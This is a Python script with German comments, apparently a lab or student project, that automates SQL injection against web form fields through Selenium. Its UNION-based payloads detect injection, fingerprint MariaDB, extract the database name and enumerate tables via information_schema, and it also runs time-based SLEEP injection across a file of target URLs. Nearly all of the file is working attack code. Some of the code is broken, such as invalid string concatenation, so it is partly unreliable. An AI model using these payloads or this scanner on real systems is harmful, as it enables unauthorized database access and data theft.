# Import necessary modules

#Grund Problem bei allem, wie viel darf vorgegeben werden?
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait

import threading

#für die Farben
init()
#Konstanten
INJECTION_STRING = "INJECTIONPOSIBLE"
MAX_TABLE_SIZE = 3

#Was wir herausgefunden haben:
injectionPossible = False
nameOfDatabase = ""
nameOfTables = []

#files
websiteFile = "websiteFile.txt"
resultFile  = "resultFile.txt"

"""FÜhrt injections versuche auf einem input feld aus
BRUTFORCE für die anzahl der spalten"""
def runInjection():
    checkString = "1 UNION SELECT ".INJECTION_STRING

"""Scheckt anhand des resultats ob eine INjection erfolgreich war"""
def checkIfInjectionIsSuccessful(pageContent):
    global injectionPossible
    if(pageContent.find(INJECTION_STRING) != -1):
        print(Fore.RED + "Injection möglich !" + Style.RESET_ALL)
        injectionPossible = True
        return True
    else:
        print(Fore.GREEN + "KEINE Injection möglich!" + Style.RESET_ALL)
        return False

""" Wenn injections möglich sind können weitere Daten herausgefunden werden, Version, schema etc"""
def informationGathering():
    #show Tables
    #describe MY_DATABASE.user_info
    #SHOW COLUMNS FROM user_info
    pass

#Hilfs Funktionen
"""Zum aufrufen einer website und inserten 1 Befehles 
 @url gibt die url an die angesteuert wird
 @id die id des input feldes
 @string gibt den String an der abgeschickt werden soll"""
def goToWebsiteAndInsert(url, id, string):
    driver = webdriver.Chrome()
    driver.get(url)
    time.sleep(2)
    input_field = driver.find_element(By.ID, id)
    input_field.send_keys(string)
    input_field.send_keys(Keys.RETURN)
    time.sleep(2)
    return driver.page_source

"""Schneidet aus einer HTML antwort alles raus und gibt nur relevantes zurücl """
def clearResult(messyString):
    soup = BeautifulSoup(messyString, 'html.parser')
    text = ' '.join(soup.find_all(text=True))
    text = ' '.join(text.split())
    matching_words = []
    words = text.split()
    # Iterate through the list of words
    for i, word in enumerate(words):
        if word.startswith("START") and word.endswith("ENDE"):
            matching_words.append(word)
    endWords = []
    for word in matching_words:
        endWords.append(word[5:-4])
    return endWords


"""Versucht herauszufidenn was für Tablen es gibt. Dabei muss es um ein String injection handeln """
def findOutTablesUnionTable(url, extraColumns, database="MY_DATABASE"):
    fillerString = ""
    for i in range(extraColumns):
        fillerString = fillerString + "NULL as col" + str(i) + ","

    injectionString = '" UNION SELECT ' + fillerString + ' CONCAT("START",TABLE_NAME, "ENDE") FROM information_schema.tables WHERE TABLE_SCHEMA = "' + database + '"#'
    id = "searchProduct"
    pageContent = goToWebsiteAndInsert(url, id,injectionString)
    tableNames = clearResult(pageContent)
    return tableNames

"""geht nur wenn es sich um string handelt """
def findOutNameOfDatabase(url, extraColumns):
    global nameOfDatabase
    fillerString = ""
    for i in range(extraColumns):
        fillerString = fillerString + "NULL as col" + str(i) + ","
    injectionString = '" Union SELECT ' + fillerString  + ' CONCAT("START", Database(), "ENDE") #'
    id = "searchProduct"
    pageContent =goToWebsiteAndInsert(url,id, injectionString)
    database = clearResult(pageContent)
    if database:
        return database

def unionAttackOnTable(url, extraColumns, id):
    fillerString = ""
    for i in range(extraColumns):
        fillerString = fillerString + "NULL as col" + str(i) + ","
    injectionString = '" UNION SELECT ' + fillerString + ' "INJECTIONPOSIBLE"# '
    result = goToWebsiteAndInsert(url, id, injectionString)
    print(checkIfInjectionIsSuccessful(result))

def sqlTypidentifizieren(url, extraColumns, id):
    #test

    fillerString = ""
    for i in range(extraColumns):
        fillerString = fillerString + "NULL as col" + str(i) + ","
    injectionString = '" UNION SELECT ' + fillerString + ' @@version; # '
    print(injectionString)
    pageContent = goToWebsiteAndInsert(url, id, injectionString)
    if (pageContent.find("maria") != -1):
        print("MARIA DB ERKANNT!")
    else:
        print("Ist NICHT maria")
        return False


def tableLogic(url, id):
    global injectionPossible
    global nameOfDatabase
    global nameOfTables

    for i in range(MAX_TABLE_SIZE):
        unionAttackOnTable(url,i,id)
    if(injectionPossible == True):
        for i in range(MAX_TABLE_SIZE):
            database = findOutNameOfDatabase(url,i)
            if database:
                nameOfDatabase = database
        if database:
            for i in range(MAX_TABLE_SIZE):
                tables = findOutTablesUnionTable(url, i, nameOfDatabase)
                if tables:
                    nameOfTables = tables

        print("injection war möglich")
        print("Die datenbank heisßt" + nameOfDatabase)
        print("Die tabellen heißen: " + nameOfTables)

def readFileForWebsites():
    targets = []
    with open(websiteFile, 'r') as f:
        for line in f:
            website = {}
            parts = line.split(',')
            website["url"] = parts[0]
            del parts[0]
            for i in range(len(parts)):
                parts[i] = parts[i].replace("\n", "")
            website["inputfields"] = parts
            targets.append(website)
    return targets
def writeREsultInFile(result):
    with open(resultFile, "w") as f:
        for line in result:
            f.write(str(line["url"]) + " " + str(line["inputfields"]) + " " + str(line["testResult"]) + "\n")
""" TImmer injection """
def timmerAttack(url, id):
    delayTime = 8                                       #seconds which are delay from thread
    thread = threading.Thread(target=checckWebsiteTimmer, args=(url,id))
    start_time = time.perf_counter()
    thread.start()
    thread.join()
    elapsed_time = time.perf_counter() - start_time
    if(elapsed_time > 18):
        print("INJECTION möglich!")
        return True
    else:
        return False

def checckWebsiteTimmer(url,id):
    driver = webdriver.Chrome()
    driver.get(url)
    input_field = driver.find_element(By.ID, id)
    input_field.send_keys("1 AND SLEEP(10)=0;")
    #input_field.send_keys("1")
    input_field.send_keys(Keys.RETURN)
    driver.quit()
"""
    injectionString = "1 AND SLEEP(10)=0;"
    goToWebsiteAndInsert(url, id, injectionString)
"""

"""
url = "http://localhost:8000/Views/indexView.php"
#url = "http://localhost:8000/indexWebshop.php"

#findOutTablesUnionTable(url,2)
tableLogic(url)
#findOutTablesUnionTable(url)
"""
"""
url = "http://localhost:8000/Views/indexView.php"

try:
    findOutTablesUnionTable(url, 2)
except:
    pass
try:
    goToWebsiteAndInsert(url, "id", "1 UNION SELECT " + '"' + INJECTION_STRING + '"')
except:
    pass

"""
"""
#bis 5 versuchen
for i in range(5):
    unionAttackOnTable(url,i)
try:
    input_field = driver.find_element(By.ID,"id")
    input_field.send_keys("1 UNION SELECT " + '"' + INJECTION_STRING + '"')

    input_field.send_keys(Keys.RETURN)
    checkIfInjectionIsSuccessful(driver.page_source)

    time.sleep(5)
except:
    print("Diese möglichkeit geht nicht, probiere weitere...")

#andere möglichkeit
driver = webdriver.Chrome()
driver.get(url)
time.sleep(5)
unionAttackOnTable(url,2)
"""

"""
url1 = "http://localhost:8000/Views/indexView.php"
url2 = "http://localhost:8000/indexWebshop.php"

id1 = "id"
id2 = "searchProduct"
sucsess1 = False
sucsess2 = False
print("Teste die erste seite " + url1)
try:
    print("Versuche Union Inject als int")
    result = goToWebsiteAndInsert(url1,id1, "1 UNION SELECT " + '"' + INJECTION_STRING + '"')
    if checkIfInjectionIsSuccessful(result):
        print("Die erste website konnte erfolgreich injectet werden!")
except:
    pass
try:
    print("Versuche injection als Tabelle")
    result = unionAttackOnTable(url1, 2, id1)
    if checkIfInjectionIsSuccessful(result):
        print("Die erste website konnte erfolgreich injectet werden!")
except:
    pass

#2 website
print("Teste die zweite seite " + url2)
try:
    print("Versuche Union Inject als int")
    result = goToWebsiteAndInsert(url2,id2, "1 UNION SELECT " + '"' + INJECTION_STRING + '"')
    if checkIfInjectionIsSuccessful(result):
        print("Die zweite website konnte erfolgreich injectet werden!")
except:
    pass
try:
    print("Versuche injection als Tabelle")
    result = unionAttackOnTable(url2, 2, id2)
    if checkIfInjectionIsSuccessful(result):
        print("Die zweite website konnte erfolgreich injectet werden!")
except:
    pass
"""
"""
url = "http://localhost:8000/indexWebshop.php"
for i in range(MAX_TABLE_SIZE):
    tables = findOutTablesUnionTable(url, i)
    if tables:
        nameOfTables = tables
        print("Die tables sind : " + tables)
    else:
        print("KEINE TABLES !")
        """

"""
targets = readFileForWebsites()
testResults = targets
for i, target in enumerate(targets):
    for x,field in enumerate(target["inputfields"]):
        print("teste : " + target["url"] + " mit der id: " + field)
        result = timmerAttack(target["url"], field)
        testResults[i]["testResult"] = result
print(testResults)

writeREsultInFile(testResults)

"""
sqlTypidentifizieren("http://localhost:8000/Views/webshopView.php", 2, "searchProduct")
#tableLogic("http://localhost:8000/indexWebshop.php", "searchProduct")
#timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")


